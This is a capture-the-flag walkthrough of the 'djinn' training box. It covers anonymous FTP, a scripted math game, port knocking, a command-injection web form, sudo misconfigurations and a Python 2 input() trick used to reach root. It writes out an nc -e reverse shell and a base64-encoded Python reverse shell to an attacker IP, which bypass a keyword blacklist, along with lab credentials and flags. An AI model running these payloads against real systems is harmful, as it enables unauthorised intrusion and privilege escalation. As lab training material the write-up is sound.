# djinn

Intermediate level vulnerable box.

# User flag

## Nmap

Let's start with a basic Nmap scan. We discover that FTP is running on port 21 with anonymous access:

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.0.54
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix
~~~

## FTP

Let's connect as `anonymous` and download the files:

~~~
$ ftp 10.10.18.78
Connected to 10.10.18.78 (10.10.18.78).
220 (vsFTPd 3.0.3)
Name (10.10.18.78:unknown): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10,10,18,78,178,169).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
ftp> mget *
~~~

The files reveal that there is a game running on port `1337`, and we are provided with a username (`@nitish81299`) and credentials (`nitu:81299`).

~~~
$ cat game.txt 
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.
$ cat message.txt 
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And don't mess up anything.
$ cat creds.txt 
nitu:81299
~~~

## Port 1337

Connecting to port `1337` reveals a game with computation challenges. If you provide the right answer, it goes to the next computation, and so on, until 1000 computations are performed. If the answer is incorrect, the program ends. At the end of the game, a secret is revealed.

Let's write a python script to solve this game.


```python
#!/usr/bin/env python
from pwn import *
import re

host, port = '10.10.18.78', 1337

context.log_level = 'warn'
s = remote(host, port)
s.recvuntil("Answer my questions 1000 times and I'll give you your gift.\n")

for i in range(1001):
  computation = s.recvline()

  r = re.search("\((\d+), '([\+\-\*\/])', (\d+)\)", computation.decode('utf-8'))

  n1 = int(r.group(1))
  op = r.group(2)
  n2 = int(r.group(3))

  if op == '+':
    n = n1 + n2
  elif op == '-':
    n = n1 - n2
  elif op == '*':
    n = n1 * n2
  else:
    n = n1 / n2

  print("[#{}] {}{}{}={}".format(i+1, n1, op, n2, n))

  s.sendline(str(n))

print(s.recvline().decode('utf-8'))
print(s.recvline().decode('utf-8'))
print(s.recvline().decode('utf-8'))

s.close()
```

Here is an extract of the program's output when run:

~~~
$ python game.py 
[#1] 5+7=12
[#2] 9/9=1.0
[#3] 7*1=7
[#4] 7-3=4
[#5] 1/4=0.25
[#6] 4/9=0.4444444444444444
[#7] 7*2=14
[#8] 5*7=35

[REDACTED]

[#997] 2*4=8
[#998] 2/8=0.25
[#999] 2-6=-4
[#1000] 5+5=10
[#1001] 6*7=42
> Here is your gift, I hope you know what to do with it:



1356, 6784, 3409
~~~

After succesfully solving the 1000 computations, the secret is revealed, and it looks like a ports sequence (port knocking).

## Port knocking

We can use Nmap to knock at the door and open the hidden port:

~~~
$ for i in 1356 6784 3409; do nmap -Pn --host-timeout 201 --max-retries 0 -p $i 10.10.40.210;done
~~~

Let's confirm what port is now unlocked

~~~
$ sudo masscan -p 1-65535 10.10.10.30 -e tun0 --rate=1000
~~~

We discover 2 new ports: `7331` and `22`. Trying to login to SSH with the credentials gathered previously fails. Let's focus on the other port for now.

## Port 7331

Nmap reveals that there is a web application running on port 7331:

~~~
$ sudo nmap -sV -p 7331 10.10.40.210
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-01 22:38 CEST
Nmap scan report for 10.10.40.210
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
~~~

A scan with `dirsearch` reveals the presence of 2 hidden locations: `/wish` and `/genie`.

The `/wish` location is a form that allows to execute commands. It redirects to `/genie` that shows a 403 error code, but the result of the command is still displayed on top of the picture (you can read the output more clearly in the source code of the page).

I tried to make a reverse shell with `nc -e /bin/bash 10.9.0.54 4444` and to make the server download a python reverse shell, but it failed with the message: "Wrong choice of words". There is likely a blacklist in the program.

Let's encode our payload in base64:

~~~
$ echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.9.0.54\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" | base64
cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNv
Y2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOS4wLjU0Iiw0
NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1
cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vYmFzaCIsIi1pIl0pOycK
~~~

Open a listener (`nc -nlvp 4444`) and send this to the form:

~~~
echo "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuOS4wLjU0Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vYmFzaCIsIi1pIl0pOycK" | base64 -d | bash
~~~

The program decoded our base64 shell and executed it. We now have a reverse shell.

We see 2 users under `/home`, 1 of which containing the user flag. Unfortunately, we don't have the permission to read the user flag or read the content of the other user's home folder.

~~~
www-data@djinn:/opt/80$ ls -l /home
ls -l /home
total 8
drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 nitish
drwxr-x--- 4 sam    sam    4096 Nov 14  2019 sam
www-data@djinn:/opt/80$ ls -l /home/nitish
ls -l /home/nitish
total 4
-rw-r----- 1 nitish nitish 33 Nov 12  2019 user.txt
www-data@djinn:/opt/80$ ls -l /home/sam
ls -l /home/sam
ls: cannot open directory '/home/sam': Permission denied
www-data@djinn:/opt/80$ 
~~~

Searching for files owned by the `nitish` reveals hidden credentials in clear:

~~~
www-data@djinn:/$ $ find / -type f -user nitish 2>/dev/null
/home/nitish/user.txt
/home/nitish/.bashrc
/home/nitish/.dev/creds.txt
www-data@djinn:/$ cat /home/nitish/.dev/creds.txt
cat /home/nitish/.dev/creds.txt
nitish:p4ssw0rdStr3r0n9
~~~

## SSH connection (nitish)

Using these credentials with SSH allows us to connect as `nitish` and get the user flag.

~~~
$ ssh nitish@10.10.104.157
nitish@djinn:~$ cat user.txt 
10aay8289ptgguy1pvfa73alzusyyx3c
~~~

User flag: `10aay8289ptgguy1pvfa73alzusyyx3c`

# Root flag

## The genie executable

Checking our privileges with `sudo -l` reveals that we can execute `genie` as `sam` without password.

~~~
nitish@djinn:~$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
nitish@djinn:~$ file /usr/bin/genie 
/usr/bin/genie: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=3f0b0d4d3dacca65084b0fbe690cac95d143e61a, not stripped
~~~

`genie` is a 64bit executable that we can run, and it has a help:

~~~
nitish@djinn:~$ /usr/bin/genie
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish
genie: error: the following arguments are required: wish
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command
~~~

Checking if there is a manual (`man genie`) reveals more available commands:

~~~
man(8)                                             genie man page                                            man(8)

NAME
       genie - Make a wish

SYNOPSIS
       genie [-h] [-g] [-p SHELL] [-e EXEC] wish

DESCRIPTION
       genie would complete all your wishes, even the naughty ones.

       We all dream of getting those crazy privelege escalations, this will even help you acheive that.

OPTIONS
       wish

              This is the wish you want to make .

       -g, --god

              Sometime we all would like to make a wish to god, this option let you make wish directly to God;

              Though genie can't gurantee you that your wish will be heard by God, he's a busy man you know;

       -p, --shell

              Well who doesn't love those. You can get shell. Ex: -p "/bin/sh"

       -e, --exec

              Execute command on someone else computer is just too damn fun, but this comes with some restrictions.

       -cmd

              You know sometime all you new is a damn CMD, windows I love you.

SEE ALSO
       mzfr.github.io

BUGS
       There are shit loads of bug in this program, it's all about finding one.

AUTHOR
       mzfr
~~~

## Lateral move (nitish -> sam)

Playing a bit with the executable and the `cmd` command led to succesfully connecting as `sam` by providing `1` to the `cmd` flag:

~~~
nitish@djinn:/usr/bin$ sudo -u sam /usr/bin/genie -cmd 1
my man!!
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
$ 
~~~

Let's check sam's privileges:

~~~
sam@djinn:/home/sam$ sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
~~~

We can run `/root/lago` as `root` without password. Here is what the program looks like when run:

~~~
sam@djinn:/home/sam$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:1
Working on it!! 
sam@djinn:/home/sam$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100: 
Enter your number: 50
Better Luck next time
sam@djinn:/home/sam$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:3
Enter the full of the file to read: /root/root.txt
Slow clap for this hacker right here
sam@djinn:/home/sam$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:4
work your ass off!!
sam@djinn:/home/sam$ 
~~~

If you closely look at files in sam's home directory, you'll notice the presence of a `.pyc` file, which is the compiled version of a program. Let's download it and decompile it with `uncompyle6`.

~~~
$ uncompyle6 lago.pyc 
# uncompyle6 version 3.7.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.3 (default, May 29 2020, 00:00:00) 
# [GCC 10.1.1 20200507 (Red Hat 10.1.1-1)]
# Embedded file name: /home/mzfr/scripts/exp.py
# Compiled at: 2019-11-07 14:05:18
from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'


if __name__ == '__main__':
    main(options())
# okay decompiling lago.pyc
~~~

It seems to be the `lago` program in `/root`. The test in the `guessit` function is interesting because we will get a shell if we provide the string `num` as user input, instead of guessing the random number.

```python
    if s == num:
        system('/bin/sh')
```

## Root flag

Let's elevate to root and get the root flag:

~~~
sam@djinn:/home/sam$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100: 
Enter your number: num
# ls -la /root      
total 64
drwx------  5 root root  4096 Nov 18  2019 .
drwxr-xr-x 23 root root  4096 Nov 11  2019 ..
-rw-------  1 root root 23351 Nov 18  2019 .bash_history
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  3 root root  4096 Oct 21  2019 .cache
drwx------  3 root root  4096 Oct 21  2019 .gnupg
-rwxr-xr-x  1 root root  1827 Nov 14  2019 lago
drwxr-xr-x  3 root root  4096 Oct 20  2019 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rwxr-xr-x  1 root root   457 Nov 12  2019 proof.sh
~~~

The root flag is in the `proff.sh` script:

~~~
#!/bin/bash

clear
figlet Amazing!!!
echo djinn pwned...
echo __________________________________________________________________________
echo
echo "Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc"
echo Path: $(pwd)
echo Date: $(date)
echo Whoami: $(whoami)
echo __________________________________________________________________________
echo
echo "By @0xmzfr"
echo ""
echo "Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)"
echo ""
~~~

Here is the output of the script:

~~~
root@djinn:/root# ./proof.sh 

    _                        _             _ _ _ 
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/       
djinn pwned...
__________________________________________________________________________

Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc
Path: /root
Date: Thu Jul 2 12:52:08 IST 2020
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
~~~

Root flag: `33eur2wjdmq80z47nyy4fx54bnlg3ibc`
